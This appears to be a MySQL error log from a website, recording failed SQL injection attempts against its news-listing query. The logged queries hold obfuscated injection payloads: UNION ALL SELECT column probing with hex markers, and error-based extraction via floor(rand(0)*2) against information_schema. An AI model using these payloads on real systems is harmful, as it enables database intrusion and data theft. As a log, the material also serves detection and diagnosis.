+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39,0x393631353738343330372e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:07:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:04:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:03:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:02:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:02:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 10:01:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9 and 1'='1' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:57:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39--=0) AND d_id=file_d_id A' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39--=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:53:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:53:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:53:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e3' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:49:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39=0) AND d_id=file_d_id AND' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 999999.9 /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:44:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39,0x393631353738343330362e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:43:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39,0x393631353738343330352e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:43:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39,0x393631353738343330342e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:41:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39,0x393631353738343330332e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:39:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x3936313537383' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39,0x393631353738343330322e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:39:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) A' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' /**//**/uNiOn/**/AlL /**//**/sElEcT 0x393631353738343330312e39 and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:35:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/*' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' or 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:34:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/*' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' or 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:34:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:33:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:32:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and 1=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:15:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:15:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:14:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**/' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' or (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:12:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:10:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:08:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9' and (/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT (/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x7e,0x413936313543373834333044,0x7e)))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS group by x)a) and '1'='1=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
+
+Time : 09:08:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''[0]=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_s' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='news' AND d_class2=c_id AND (d_class2=? || 9'[0]=0) AND d_id=file_d_id AND file_type='newsCover' AND d_active=1 ORDER BY d_sort ASC
